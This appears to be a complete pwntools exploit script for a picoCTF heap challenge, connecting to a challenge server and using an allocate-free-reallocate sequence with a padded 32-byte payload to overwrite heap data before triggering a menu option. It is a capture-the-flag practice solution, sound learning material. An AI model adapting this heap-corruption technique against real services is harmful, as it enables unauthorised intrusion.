#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'tethys.picoctf.net', 60655 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main
'''.format(**locals())

def allocate(size, data):
    io.sendlineafter(b': ', b'2')
    io.sendlineafter(b': ', f'{size}'.encode())
    io.sendlineafter(b': ', f'{data}'.encode())

def free():
    io.sendlineafter(b': ', b'5')

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    allocate('4', 'cokk')
    free()
    allocate('32', 'aaaabbbbccccddddeeeeffffgggghhpico')
    io.sendlineafter(b': ', b'4')
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()